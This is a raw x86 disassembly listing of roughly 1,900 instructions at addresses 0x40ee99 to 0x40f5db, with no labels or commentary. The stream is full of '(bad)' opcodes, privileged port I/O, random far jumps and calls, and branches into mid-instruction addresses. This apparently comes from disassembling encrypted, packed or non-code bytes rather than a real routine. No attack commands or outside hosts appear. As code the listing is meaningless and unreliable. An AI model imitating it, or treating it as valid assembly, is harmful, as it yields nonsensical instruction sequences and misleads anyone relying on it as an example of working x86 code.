  40ee99:	mov    ecx,0xade6762d
  40ee9e:	popa   
  40ee9f:	mov    BYTE PTR [edx-0x48cba99e],bh
  40eea5:	pop    ebp
  40eea6:	shl    BYTE PTR [eax-0x58],1
  40eea9:	std    
  40eeaa:	mov    edx,0xc68a1545
  40eeaf:	mov    ebx,0xe29bb853
  40eeb4:	or     al,0xbe
  40eeb6:	mov    cl,0xfa
  40eeb8:	pusha  
  40eeb9:	xor    eax,ecx
  40eebb:	daa    
  40eebc:	cwde   
  40eebd:	nop
  40eebe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eebf:	pop    ss
  40eec0:	dec    DWORD PTR [esi+0x35f36606]
  40eec6:	(bad)  
  40eec7:	jmp    0xa2d1:0xbf31639c
  40eece:	add    DWORD PTR [ebx+0x29],ecx
  40eed1:	lods   eax,DWORD PTR ds:[esi]
  40eed2:	pop    es
  40eed3:	pushf  
  40eed4:	popa   
  40eed5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eed6:	pop    edi
  40eed7:	mov    dh,0x6a
  40eed9:	sbb    BYTE PTR [ebx],0x48
  40eedc:	adc    DWORD PTR [eax+0x6a406a07],esp
  40eee2:	pop    eax
  40eee3:	mov    edx,0xa0ac3bc2
  40eee8:	push   eax
  40eee9:	sub    DWORD PTR [ebx-0x6],ecx
  40eeec:	and    bl,BYTE PTR [edi+ebp*2+0x4a665892]
  40eef3:	and    al,0xe4
  40eef5:	push   0x84a65efb
  40eefa:	mov    eax,0x4929f69a
  40eeff:	in     eax,dx
  40ef00:	fs mov edi,0xaa6c61e6
  40ef07:	jo     0x40eefc
  40ef09:	jnp    0x40ef25
  40ef0b:	icebp  
  40ef0c:	mov    cs,WORD PTR [eax+0x0]
  40ef0f:	test   esi,esp
  40ef11:	outs   dx,DWORD PTR ds:[esi]
  40ef12:	add    esi,DWORD PTR [esi+0x29339ca4]
  40ef18:	mov    al,0x89
  40ef1a:	or     DWORD PTR ds:0x4e85a5db,ecx
  40ef20:	or     BYTE PTR [edx],dl
  40ef22:	mov    ds:0x987c1a7f,eax
  40ef27:	addr16 inc eax
  40ef29:	and    al,BYTE PTR [eax+0x77]
  40ef2c:	or     DWORD PTR [ebx+0x3],ecx
  40ef2f:	push   es
  40ef30:	into   
  40ef31:	(bad)  
  40ef32:	in     eax,dx
  40ef33:	xchg   edi,eax
  40ef34:	ror    BYTE PTR [ecx+edi*2],0x9e
  40ef38:	test   BYTE PTR [edx+0x2d34a39b],0x1d
  40ef3f:	shl    BYTE PTR [ebx+0x3cb4964c],1
  40ef45:	dec    ecx
  40ef46:	dec    ebp
  40ef47:	(bad)  
  40ef48:	popf   
  40ef49:	ins    BYTE PTR es:[edi],dx
  40ef4a:	js     0x40eed0
  40ef4c:	mov    WORD PTR ds:0x692edba7,?
  40ef52:	adc    DWORD PTR [edi],ecx
  40ef54:	(bad)  
  40ef55:	stos   DWORD PTR es:[edi],eax
  40ef56:	and    BYTE PTR [edi-0x52],cl
  40ef59:	xchg   ebx,eax
  40ef5a:	xchg   ebx,eax
  40ef5b:	push   ecx
  40ef5c:	aaa    
  40ef5d:	dec    edi
  40ef5e:	fidiv  DWORD PTR [edx-0x3a]
  40ef61:	retf   0x796b
  40ef64:	fwait
  40ef65:	xor    cl,BYTE PTR [esi+0x56]
  40ef68:	mov    cl,0xcb
  40ef6a:	daa    
  40ef6b:	jno    0x40ef06
  40ef6d:	and    bh,BYTE PTR [eax-0x5f]
  40ef70:	push   ecx
  40ef71:	arpl   WORD PTR [esi-0x70b44fe6],cx
  40ef77:	xchg   ebp,eax
  40ef78:	lods   eax,DWORD PTR ds:[esi]
  40ef79:	pushf  
  40ef7a:	stc    
  40ef7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef7d:	pop    edx
  40ef7e:	in     eax,0xf3
  40ef80:	dec    ecx
  40ef81:	ins    BYTE PTR es:[edi],dx
  40ef82:	fwait
  40ef83:	outs   dx,DWORD PTR ds:[esi]
  40ef84:	pop    es
  40ef85:	inc    edx
  40ef86:	mov    cl,0xf2
  40ef88:	inc    ecx
  40ef89:	sbb    edi,ebp
  40ef8b:	mov    esi,0x25c0ed6d
  40ef90:	cs ins BYTE PTR es:[edi],dx
  40ef92:	adc    al,0x9d
  40ef94:	cwde   
  40ef95:	sub    eax,0x9be454d
  40ef9a:	test   al,0x2b
  40ef9c:	dec    ebx
  40ef9d:	or     esp,DWORD PTR [ebp+0x78]
  40efa0:	push   ds
  40efa1:	stc    
  40efa2:	scas   eax,DWORD PTR es:[edi]
  40efa3:	xchg   al,bh
  40efa5:	sbb    eax,0xea41cbf0
  40efaa:	int    0x9a
  40efac:	dec    edi
  40efad:	outs   dx,BYTE PTR ds:[esi]
  40efae:	aas    
  40efaf:	test   eax,0xf1210a13
  40efb4:	std    
  40efb5:	xchg   esp,eax
  40efb6:	dec    ecx
  40efb7:	cmc    
  40efb8:	scas   eax,DWORD PTR es:[edi]
  40efb9:	dec    ecx
  40efba:	adc    DWORD PTR [esi+ebp*4-0x53b2857],ebx
  40efc1:	shl    BYTE PTR [ecx],0x69
  40efc4:	in     eax,0xb1
  40efc6:	das    
  40efc7:	pop    eax
  40efc8:	pop    edi
  40efc9:	fadd   st,st(4)
  40efcb:	pop    eax
  40efcc:	lds    edx,FWORD PTR [eax]
  40efce:	jmp    0xc558:0x78f99aaf
  40efd5:	ficom  DWORD PTR [ebp-0x2326312e]
  40efdb:	nop
  40efdc:	inc    edi
  40efdd:	mov    esp,0xacce6db
  40efe2:	loopne 0x40efd2
  40efe4:	pop    ds
  40efe5:	ss jmp 0x5b0aa401
  40efeb:	repz dec edx
  40efed:	sti    
  40efee:	inc    edi
  40efef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eff0:	js     0x40efd6
  40eff2:	mov    DWORD PTR [edx],0x666ff96d
  40eff8:	adc    al,0xae
  40effa:	fisttp WORD PTR [edx+0x1b]
  40effd:	ror    BYTE PTR [edi-0x683b0eff],0xcb
  40f004:	add    al,0x41
  40f006:	fucomip st,st(2)
  40f008:	fsubr  QWORD PTR [esi]
  40f00a:	(bad)  
  40f00b:	mov    cl,0x25
  40f00d:	pop    ss
  40f00e:	sub    BYTE PTR [ecx+0x4],ah
  40f011:	dec    ebp
  40f012:	dec    edi
  40f013:	inc    esp
  40f014:	cmp    dh,ch
  40f016:	pop    edx
  40f017:	lds    ebp,FWORD PTR [eiz*4-0x7dfd18d]
  40f01e:	sbb    al,0x74
  40f020:	or     dl,BYTE PTR [ebp-0xb]
  40f023:	scas   al,BYTE PTR es:[edi]
  40f024:	lea    ebp,[ecx-0x5b57dec0]
  40f02a:	dec    ecx
  40f02b:	cs jbe 0x40efdb
  40f02e:	(bad)  
  40f02f:	mov    ebx,ecx
  40f031:	int3   
  40f032:	retf   
  40f033:	out    0xe7,al
  40f035:	inc    edx
  40f036:	xchg   ecx,eax
  40f037:	or     dh,bh
  40f039:	dec    edx
  40f03a:	xor    BYTE PTR [ebx-0x1b],dl
  40f03d:	(bad)  
  40f03e:	fidivr WORD PTR [edi-0x7f]
  40f041:	or     DWORD PTR [edi-0x35],edx
  40f044:	jmp    0x40f0b4
  40f046:	data16 dec bx
  40f049:	adc    eax,0xdb392867
  40f04e:	gs sub eax,0xbb8ebf60
  40f054:	xchg   ebp,eax
  40f055:	test   bh,0xd3
  40f058:	and    bh,dh
  40f05a:	test   eax,0x453e0195
  40f05f:	xor    eax,0x27065d3c
  40f064:	push   dx
  40f066:	sbb    edi,DWORD PTR [edi-0x1de16d73]
  40f06c:	(bad)  [edx-0x25]
  40f06f:	inc    ebp
  40f070:	xchg   ebp,eax
  40f071:	add    al,0x4e
  40f073:	xlat   BYTE PTR gs:[ebx]
  40f075:	and    DWORD PTR [edi+edi*8],0xd1dcd8b6
  40f07c:	cmp    DWORD PTR [ebp-0x52b4cf5e],eax
  40f082:	out    dx,eax
  40f083:	xchg   ecx,eax
  40f084:	stc    
  40f085:	(bad)
  40f088:	pusha  
  40f089:	jecxz  0x40f030
  40f08b:	mov    dh,0x95
  40f08d:	inc    esp
  40f08e:	inc    ebx
  40f08f:	push   edx
  40f090:	int    0x44
  40f092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f093:	jl     0x40f066
  40f095:	stos   DWORD PTR es:[edi],eax
  40f096:	scas   al,BYTE PTR es:[edi]
  40f097:	xchg   ecx,eax
  40f098:	pop    ecx
  40f099:	in     al,0x3b
  40f09b:	add    BYTE PTR [edi-0x35160152],dh
  40f0a1:	jb     0x40f0b0
  40f0a3:	imul   esp,DWORD PTR [ebx-0x77],0x51475408
  40f0aa:	fcomp  DWORD PTR [ecx+0x2d]
  40f0ad:	inc    edx
  40f0ae:	gs jb  0x40f083
  40f0b1:	jbe    0x40f0cc
  40f0b3:	or     BYTE PTR [edx],bl
  40f0b5:	mov    al,BYTE PTR [ebx-0x4e]
  40f0b8:	aad    0x28
  40f0ba:	das    
  40f0bb:	jge    0x40f048
  40f0bd:	aad    0xfc
  40f0bf:	popf   
  40f0c0:	in     eax,dx
  40f0c1:	adc    cl,bl
  40f0c3:	mov    ch,0xa9
  40f0c5:	pminsw mm6,QWORD PTR [eax+0x52]
  40f0c9:	xor    BYTE PTR [ecx+0x68],ah
  40f0cc:	push   ss
  40f0cd:	or     eax,0xa7812388
  40f0d2:	gs inc esp
  40f0d4:	icebp  
  40f0d5:	push   ds
  40f0d6:	jl     0x40f0ff
  40f0d8:	xchg   edi,eax
  40f0d9:	mov    ds:0xeabd3f97,eax
  40f0de:	out    0x2,eax
  40f0e0:	or     bl,BYTE PTR [edx+eiz*1-0x4b]
  40f0e4:	es clc 
  40f0e6:	scas   al,BYTE PTR es:[edi]
  40f0e7:	loope  0x40f0d2
  40f0e9:	mov    al,ds:0x71278299
  40f0ee:	push   ebx
  40f0ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0f0:	ss (bad) 
  40f0f2:	sti    
  40f0f3:	lahf   
  40f0f4:	in     eax,dx
  40f0f5:	shl    ecx,cl
  40f0f7:	jns    0x40f0e8
  40f0f9:	adc    BYTE PTR [ecx+0x5f5d079d],0x33
  40f100:	mov    eax,ds:0x17b3fd6e
  40f105:	dec    esp
  40f106:	enter  0x2902,0xc
  40f10a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f10b:	xor    DWORD PTR [edx+0x38],edx
  40f10e:	and    BYTE PTR [edx-0x2],ch
  40f111:	xchg   ebx,eax
  40f112:	cli    
  40f113:	lds    edi,FWORD PTR [edx+edx*8+0x1b]
  40f117:	je     0x40f185
  40f119:	(bad)  
  40f11b:	inc    esi
  40f11c:	and    DWORD PTR ds:0x8ca38d1a,ebp
  40f122:	cld    
  40f123:	pop    es
  40f124:	push   ebx
  40f125:	test   DWORD PTR [ecx-0x20],ebx
  40f128:	int3   
  40f129:	fld    TBYTE PTR [ebp-0x12]
  40f12c:	frstor [ebx+0x4a]
  40f12f:	push   ebp
  40f130:	je     0x40f122
  40f132:	in     al,0xa6
  40f134:	push   edi
  40f135:	std    
  40f136:	(bad)  
  40f137:	fsub   DWORD PTR [ebx]
  40f139:	pop    es
  40f13a:	xchg   esp,eax
  40f13b:	jge    0x40f13f
  40f13d:	(bad)  
  40f13f:	xor    eax,0xc7bdeb37
  40f144:	sbb    dl,BYTE PTR [esi+0x6]
  40f147:	or     BYTE PTR [edi+0x6c],ch
  40f14a:	mov    esp,0xd8969172
  40f14f:	cdq    
  40f150:	lods   al,BYTE PTR ds:[esi]
  40f151:	imul   edx,DWORD PTR [esi*8+0x4f0cad41],0x24e343dc
  40f15c:	out    0x43,al
  40f15e:	sub    DWORD PTR [edx-0x75adfac7],ebx
  40f164:	mov    al,0xaa
  40f166:	daa    
  40f167:	cmp    al,0x15
  40f169:	xchg   ebx,eax
  40f16a:	ja     0x40f147
  40f16c:	pusha  
  40f16d:	sbb    dh,BYTE PTR [ebx+0x14]
  40f170:	push   ss
  40f171:	shr    WORD PTR [eax],0x79
  40f175:	imul   esi,DWORD PTR fs:[esi+eiz*1+0x3c8d99c5],0x4
  40f17e:	idiv   DWORD PTR [ecx+eiz*2-0x74]
  40f182:	push   esp
  40f183:	dec    ebx
  40f184:	xor    ah,BYTE PTR [esi+0x27]
  40f187:	and    edi,DWORD PTR [edx+eiz*2-0x5913f8e1]
  40f18e:	pop    esp
  40f18f:	mov    edi,0x8a31ea1
  40f194:	sbb    DWORD PTR [edi+0x33f966bc],edx
  40f19a:	ja     0x40f1ea
  40f19c:	and    al,0x3
  40f19e:	xchg   ebp,eax
  40f19f:	jp     0x40f12a
  40f1a1:	inc    edi
  40f1a2:	fbstp  TBYTE PTR [eax]
  40f1a4:	dec    edx
  40f1a5:	push   ebp
  40f1a6:	(bad)  
  40f1a7:	mov    edi,0x47c9313c
  40f1ac:	je     0x40f1f0
  40f1ae:	jo     0x40f212
  40f1b0:	in     al,0xcf
  40f1b2:	cmp    ecx,DWORD PTR [edi-0x12]
  40f1b5:	sub    al,0xf5
  40f1b7:	xor    BYTE PTR [eax],ch
  40f1b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1ba:	pop    ds
  40f1bb:	enter  0x1fb8,0x91
  40f1bf:	nop
  40f1c0:	call   0x3087:0xaf3abb7d
  40f1c7:	mov    bl,0xba
  40f1c9:	ret    
  40f1ca:	xchg   ecx,eax
  40f1cb:	dec    esp
  40f1cc:	and    dh,BYTE PTR ds:0xa8b3bba4
  40f1d2:	xlat   BYTE PTR fs:[ebx]
  40f1d4:	jmp    DWORD PTR [ebx]
  40f1d6:	xchg   edi,eax
  40f1d7:	jg     0x40f19e
  40f1d9:	icebp  
  40f1da:	cld    
  40f1db:	fild   DWORD PTR [edi+0x45]
  40f1de:	repnz xchg esp,eax
  40f1e0:	dec    ebx
  40f1e1:	cmp    ch,BYTE PTR [eax+ecx*1+0xc4b255d]
  40f1e8:	jecxz  0x40f25a
  40f1ea:	(bad)  
  40f1eb:	lea    edi,[edx+0x3]
  40f1ee:	jg     0x40f18f
  40f1f0:	sub    al,0xd4
  40f1f2:	test   DWORD PTR [eax],ecx
  40f1f4:	pop    ds
  40f1f5:	mov    edi,0xc3450fec
  40f1fa:	lds    ecx,FWORD PTR [esi+0x3e598083]
  40f200:	push   ecx
  40f201:	ficomp DWORD PTR [ebp+0x6a4d939e]
  40f207:	xchg   ebp,eax
  40f208:	das    
  40f209:	mov    es,edi
  40f20b:	test   eax,0x5e2e9aac
  40f210:	imul   edi,edx,0xffffff9b
  40f213:	mov    ecx,0x1fe8200e
  40f218:	daa    
  40f219:	mov    ds:0x50a7747e,al
  40f21e:	mov    edi,DWORD PTR [edi+0x2c]
  40f221:	or     eax,0x3db133a3
  40f226:	mov    ch,0x23
  40f228:	test   BYTE PTR [edx+0x28bd4a0f],ch
  40f22e:	(bad)  [eax]
  40f230:	(bad)  
  40f231:	jecxz  0x40f208
  40f233:	pop    edi
  40f234:	sub    al,0x8
  40f236:	mov    esi,0xc7cc4dc
  40f23b:	push   esp
  40f23c:	out    dx,al
  40f23d:	mov    al,0x23
  40f23f:	shr    DWORD PTR [edx-0x48],cl
  40f242:	fnstenv [ecx]
  40f244:	ss call 0x63d3:0x77ff8875
  40f24c:	mov    DWORD PTR [edx-0x47],esi
  40f24f:	sub    ch,bh
  40f251:	rcr    ch,cl
  40f253:	adc    ebx,ebp
  40f255:	pop    ss
  40f256:	sub    ah,cl
  40f258:	adc    dh,BYTE PTR [edx+0x69402cef]
  40f25e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f25f:	jne    0x40f2c3
  40f261:	jno    0x40f293
  40f263:	jmp    0xd2132de8
  40f268:	add    BYTE PTR [edi+ecx*2+0x32e4f9a],0x8d
  40f270:	ss jle 0x40f2c0
  40f273:	ins    BYTE PTR es:[edi],dx
  40f274:	ja     0x40f2e8
  40f276:	push   es
  40f277:	iret   
  40f278:	hlt    
  40f279:	sbb    BYTE PTR [ecx+0x2f822a2e],0x62
  40f280:	dec    edi
  40f281:	shr    ebx,1
  40f283:	mov    ?,esp
  40f285:	scas   eax,DWORD PTR es:[edi]
  40f286:	jecxz  0x40f278
  40f288:	(bad)  
  40f289:	popa   
  40f28a:	or     ecx,esp
  40f28c:	dec    ebp
  40f28d:	mov    al,ds:0x59268e6f
  40f292:	add    eax,0x85847807
  40f297:	adc    dh,BYTE PTR [edi+0x27]
  40f29a:	jns    0x40f272
  40f29c:	ins    DWORD PTR es:[edi],dx
  40f29d:	jno    0x40f241
  40f29f:	cmp    BYTE PTR [edx-0x63],bl
  40f2a2:	adc    al,0xde
  40f2a4:	lods   eax,DWORD PTR ds:[esi]
  40f2a5:	stos   DWORD PTR es:[edi],eax
  40f2a6:	mov    bl,0x77
  40f2a8:	clc    
  40f2a9:	xor    al,0xdd
  40f2ab:	xor    BYTE PTR [edi-0x32],cl
  40f2ae:	cmp    BYTE PTR [esi-0xd],bl
  40f2b1:	aaa    
  40f2b2:	cmp    ecx,DWORD PTR [ebp+0x4b]
  40f2b5:	jle    0x40f2aa
  40f2b7:	retf   0xff5
  40f2ba:	imul   ah
  40f2bc:	cmp    ecx,DWORD PTR [esi+0x6a]
  40f2bf:	or     bl,BYTE PTR [ebx-0x64]
  40f2c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2c3:	(bad)  
  40f2c4:	cmp    eax,0xf409296c
  40f2c9:	ret    0xf793
  40f2cc:	adc    al,0x79
  40f2ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2cf:	inc    ecx
  40f2d0:	dec    ecx
  40f2d1:	pop    ds
  40f2d2:	mov    ebp,0x24e240ec
  40f2d7:	xchg   esi,eax
  40f2d8:	adc    ch,BYTE PTR [eax]
  40f2da:	int3   
  40f2db:	sub    al,0xb3
  40f2dd:	call   0x1e11:0x9ec991f0
  40f2e4:	call   FWORD PTR ds:0x6872e968
  40f2ea:	(bad)  
  40f2eb:	bound  ebx,QWORD PTR [eax-0x62]
  40f2ee:	outs   dx,BYTE PTR ds:[esi]
  40f2ef:	std    
  40f2f0:	cmp    eax,0xf6da0112
  40f2f5:	push   ds
  40f2f6:	lahf   
  40f2f7:	sbb    ah,BYTE PTR [ebp-0x61]
  40f2fa:	or     ah,bl
  40f2fc:	push   edx
  40f2fd:	jle    0x40f2df
  40f2ff:	in     eax,0x41
  40f301:	and    DWORD PTR [edx-0x77c8ef81],0x34
  40f308:	ret    0xe54f
  40f30b:	pop    eax
  40f30c:	clc    
  40f30d:	ret    0x22a1
  40f310:	(bad)  
  40f311:	daa    
  40f312:	in     al,dx
  40f313:	fmul   QWORD PTR [esi]
  40f315:	jae    0x40f355
  40f317:	cmp    al,BYTE PTR ds:0x94b5ad80
  40f31d:	adc    al,0x33
  40f31f:	aad    0xbe
  40f321:	and    BYTE PTR ds:0x374a1297,ah
  40f327:	popa   
  40f328:	ror    DWORD PTR [ecx-0x100a6b0e],1
  40f32e:	cmp    al,0x9b
  40f330:	xor    BYTE PTR [edi+0x2b281c4b],0x15
  40f337:	dec    edi
  40f338:	cmc    
  40f339:	xor    ecx,DWORD PTR [edi]
  40f33b:	mov    ebx,0x2b3432b
  40f340:	std    
  40f341:	mov    bl,BYTE PTR [ebp-0x49631099]
  40f347:	push   edx
  40f348:	leave  
  40f349:	xchg   DWORD PTR [ecx],ecx
  40f34b:	sbb    BYTE PTR [edi],dh
  40f34d:	(bad)  
  40f34f:	(bad)  
  40f350:	(bad)  
  40f351:	mov    ebp,0x2abf993c
  40f356:	pop    es
  40f357:	add    BYTE PTR [ecx+0x77],ah
  40f35a:	bound  esi,QWORD PTR [ebx+0x6f]
  40f35d:	inc    edi
  40f35e:	(bad)  
  40f35f:	fist   WORD PTR [ebx-0x32]
  40f362:	loope  0x40f347
  40f364:	popa   
  40f365:	stos   DWORD PTR es:[edi],eax
  40f366:	xor    DWORD PTR [edi+0x13],eax
  40f369:	ret    0xaf25
  40f36c:	sbb    dh,BYTE PTR [edx]
  40f36e:	mov    ecx,0xfd461fd1
  40f373:	cld    
  40f374:	jo     0x40f3ec
  40f376:	mov    bl,0xd8
  40f378:	push   ss
  40f379:	in     al,dx
  40f37a:	sbb    al,0xf2
  40f37c:	hlt    
  40f37d:	es popa 
  40f37f:	push   ebx
  40f380:	bt     DWORD PTR [esi],eax
  40f383:	xchg   ecx,eax
  40f384:	add    ebx,0xffffffb8
  40f387:	or     BYTE PTR [edx],0x42
  40f38a:	adc    bl,cl
  40f38c:	pop    esp
  40f38d:	jmp    0x4ac42f62
  40f392:	das    
  40f393:	popa   
  40f394:	sbb    bh,al
  40f396:	xor    al,0x34
  40f398:	ret    0x20f0
  40f39b:	fwait
  40f39c:	call   0x8443:0x5ea21fb1
  40f3a3:	xor    DWORD PTR [ebx],eax
  40f3a5:	arpl   WORD PTR [ebx],di
  40f3a7:	shl    BYTE PTR [eax-0x4319caaf],cl
  40f3ad:	mov    esp,0x78fd0b39
  40f3b2:	ror    edi,cl
  40f3b4:	inc    esi
  40f3b5:	xor    eax,0xd66279f3
  40f3ba:	mov    cl,0x67
  40f3bc:	retf   
  40f3bd:	pop    ds
  40f3be:	sub    eax,0x6f5db1e6
  40f3c3:	das    
  40f3c4:	mov    esp,0xb46af002
  40f3c9:	pop    ebx
  40f3ca:	push   0xcacb8743
  40f3cf:	xchg   esi,eax
  40f3d0:	sub    ebp,edi
  40f3d2:	paddq  mm5,QWORD PTR [ebp+0x7c]
  40f3d6:	jae    0x40f3be
  40f3d8:	push   esi
  40f3d9:	test   eax,0xb78eb530
  40f3de:	push   0xed751ce3
  40f3e3:	nop
  40f3e4:	pop    es
  40f3e5:	mov    esp,0x2b6d25d3
  40f3ea:	enter  0xbad8,0xe0
  40f3ee:	mov    ebx,0x4527e7e8
  40f3f3:	pop    edx
  40f3f4:	pop    edi
  40f3f5:	lods   al,BYTE PTR ds:[esi]
  40f3f6:	test   DWORD PTR [edx],ebx
  40f3f8:	dec    ebx
  40f3f9:	xchg   edi,eax
  40f3fa:	xor    BYTE PTR [edi+0xe8948e3],ch
  40f400:	xor    eax,0xd298250d
  40f405:	ficomp WORD PTR [ebx+0x26dc2251]
  40f40b:	inc    edx
  40f40c:	mov    DWORD PTR [eax+0x3b51b398],ecx
  40f412:	aam    0xdc
  40f414:	adc    ebx,DWORD PTR [ebx+ecx*8+0x53b12f81]
  40f41b:	or     al,0x4a
  40f41d:	icebp  
  40f41e:	pop    ss
  40f41f:	rcr    DWORD PTR [ebx],1
  40f421:	mov    bh,0x24
  40f423:	fbstp  TBYTE PTR [eax-0x71]
  40f426:	xlat   BYTE PTR ds:[ebx]
  40f427:	call   FWORD PTR [eax+0x48]
  40f42a:	inc    edi
  40f42b:	pop    ebp
  40f42c:	arpl   ax,di
  40f42e:	jl     0x40f3d1
  40f430:	adc    esi,edx
  40f432:	icebp  
  40f433:	sti    
  40f434:	rol    DWORD PTR [eax],1
  40f436:	mov    ebx,0x67288fd6
  40f43b:	stc    
  40f43c:	je     0x40f41a
  40f43e:	and    DWORD PTR cs:[eax],esp
  40f441:	fisubr DWORD PTR [eax]
  40f443:	stc    
  40f444:	or     DWORD PTR [ecx+ebp*1+0x1],edx
  40f448:	mov    cl,0x98
  40f44a:	lahf   
  40f44b:	xchg   ebp,eax
  40f44c:	aas    
  40f44d:	adc    eax,ecx
  40f44f:	xor    al,0x5e
  40f451:	aas    
  40f452:	mov    edi,0xb83c11c0
  40f457:	iret   
  40f458:	adc    eax,0x29eab767
  40f45d:	js     0x40f451
  40f45f:	sub    al,0xcd
  40f461:	retf   
  40f462:	popf   
  40f463:	aas    
  40f464:	add    eax,0x66d654d1
  40f469:	add    al,0x26
  40f46b:	in     al,0x7e
  40f46d:	pop    esp
  40f46e:	pop    ss
  40f46f:	mov    ecx,0x5a563bc
  40f474:	xor    dl,bh
  40f476:	mov    edi,0x277a7638
  40f47b:	or     eax,0x7e30284
  40f480:	adc    ah,BYTE PTR [esi-0x6]
  40f483:	ror    dl,0xd
  40f486:	pop    esi
  40f487:	mov    ebx,0x119d0e82
  40f48c:	int    0x8b
  40f48e:	rol    DWORD PTR [eax],0x9a
  40f491:	push   cs
  40f492:	ins    DWORD PTR es:[edi],dx
  40f493:	add    eax,0x1cfd4811
  40f498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f499:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40f49b:	cld    
  40f49c:	xchg   esi,eax
  40f49d:	or     al,BYTE PTR [edx]
  40f49f:	xor    ecx,DWORD PTR [ecx]
  40f4a1:	inc    esi
  40f4a2:	out    0x33,al
  40f4a4:	mov    ecx,0xe06bb138
  40f4a9:	or     edi,DWORD PTR [edi]
  40f4ab:	cmp    al,0x57
  40f4ad:	mov    esp,0xa1c4885a
  40f4b2:	sbb    bh,BYTE PTR [edi]
  40f4b4:	and    cl,BYTE PTR [edi]
  40f4b6:	out    dx,al
  40f4b7:	mov    ds:0x7acfc853,al
  40f4bc:	in     al,dx
  40f4bd:	lea    ebx,[eax]
  40f4bf:	leave  
  40f4c0:	adc    esp,DWORD PTR [ebx-0x44]
  40f4c3:	popa   
  40f4c4:	retf   
  40f4c5:	popa   
  40f4c6:	push   es
  40f4c7:	jnp    0x40f4ed
  40f4c9:	(bad)  
  40f4ca:	fstp   DWORD PTR [ecx]
  40f4cc:	xchg   DWORD PTR ds:0xe142089a,ebp
  40f4d2:	mov    eax,0xc7946467
  40f4d7:	jo     0x40f493
  40f4d9:	and    dl,BYTE PTR [edi-0x7]
  40f4dc:	push   ebx
  40f4dd:	out    0xac,eax
  40f4df:	pop    ds
  40f4e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4e1:	pop    esi
  40f4e2:	repnz inc ebx
  40f4e4:	cmc    
  40f4e5:	mov    ch,0xc
  40f4e7:	outs   dx,BYTE PTR ds:[esi]
  40f4e8:	pop    eax
  40f4e9:	arpl   cx,cx
  40f4eb:	(bad)  
  40f4ec:	lea    esp,[eax-0x32]
  40f4ef:	sar    cl,1
  40f4f1:	les    esp,FWORD PTR [ebx]
  40f4f3:	shr    BYTE PTR [eax+edx*2-0x75ef4b50],0x7b
  40f4fb:	shl    ecx,1
  40f4fd:	inc    ebp
  40f4fe:	je     0x40f4d0
  40f500:	jmp    0xc3c5b030
  40f505:	add    ah,BYTE PTR [esi]
  40f507:	jecxz  0x40f4e6
  40f509:	test   DWORD PTR [edx],eax
  40f50b:	or     ah,BYTE PTR [edx+0xd1c4970]
  40f511:	cld    
  40f512:	adc    ebx,DWORD PTR [edx-0x45741a17]
  40f518:	imul   DWORD PTR [esp+edi*8+0x25]
  40f51c:	stc    
  40f51d:	dec    ecx
  40f51e:	jmp    0x40f53f
  40f520:	out    dx,eax
  40f521:	repz sub esp,esi
  40f524:	xchg   edi,ebp
  40f526:	sbb    eax,0xa8b000a8
  40f52b:	cmc    
  40f52c:	cmp    BYTE PTR [eax-0x4d],cl
  40f52f:	xchg   DWORD PTR [ebx+0xe],ebx
  40f532:	fist   DWORD PTR [ebp-0x1a]
  40f535:	xlat   BYTE PTR ds:[ebx]
  40f536:	push   0xe1926f32
  40f53b:	and    dh,0x3c
  40f53e:	aas    
  40f53f:	or     al,0x17
  40f541:	test   al,0xe0
  40f543:	mov    ch,0x1a
  40f545:	leave  
  40f546:	or     al,0x7b
  40f548:	(bad)  
  40f549:	xchg   esp,eax
  40f54a:	mov    bh,0x4f
  40f54c:	dec    esp
  40f54d:	sbb    eax,0xd1bd6878
  40f552:	mov    ebx,0x81745487
  40f557:	or     al,0xab
  40f559:	pop    esi
  40f55a:	mov    dh,0xd5
  40f55c:	arpl   WORD PTR [ecx],cx
  40f55e:	push   eax
  40f55f:	mov    fs,WORD PTR [esi-0x6a63553c]
  40f565:	adc    dl,BYTE PTR [ebx+0x704c6d01]
  40f56b:	out    dx,al
  40f56c:	xor    BYTE PTR [ebx],al
  40f56e:	addr16 add cl,cl
  40f571:	add    DWORD PTR [eax-0x481c2386],esp
  40f577:	and    DWORD PTR [edx+0x3c165251],esi
  40f57d:	fcom   st(4)
  40f57f:	sub    edx,ebx
  40f581:	retf   0xe73
  40f584:	pop    es
  40f585:	sub    DWORD PTR [ebx+eax*8],edx
  40f588:	and    ebx,DWORD PTR [eax+eax*2]
  40f58b:	psubsb mm3,mm7
  40f58e:	or     al,BYTE PTR [edi]
  40f590:	je     0x40f546
  40f592:	xlat   BYTE PTR ds:[ebx]
  40f593:	imul   BYTE PTR [ebp+0x53]
  40f596:	sub    cl,BYTE PTR [esi-0x40]
  40f599:	call   0x4f3525f1
  40f59e:	stc    
  40f59f:	push   edx
  40f5a0:	pop    edx
  40f5a1:	(bad)  
  40f5a2:	clc    
  40f5a3:	sbb    edx,edx
  40f5a5:	pushf  
  40f5a6:	into   
  40f5a7:	lock mov eax,0x9f6c6cd0
  40f5ad:	cmp    al,0xff
  40f5af:	xor    dl,ch
  40f5b1:	mov    ds:0xcd21ae7,al
  40f5b6:	(bad)  
  40f5b7:	xchg   DWORD PTR [esi-0x45a65508],edx
  40f5bd:	xor    al,0x65
  40f5bf:	pop    eax
  40f5c0:	cmp    al,0x8a
  40f5c2:	jge    0x40f5ad
  40f5c4:	jmp    0x7244:0x3590cae5
  40f5cb:	outs   dx,BYTE PTR ds:[esi]
  40f5cc:	xor    al,0x79
  40f5ce:	mov    ?,esp
  40f5d0:	adc    dl,bl
  40f5d2:	ret    0x428c
  40f5d5:	fistp  WORD PTR [edx+ebp*8]
  40f5d8:	mov    dh,0x61
  40f5da:	push   edx
  40f5db:	or     al,dh
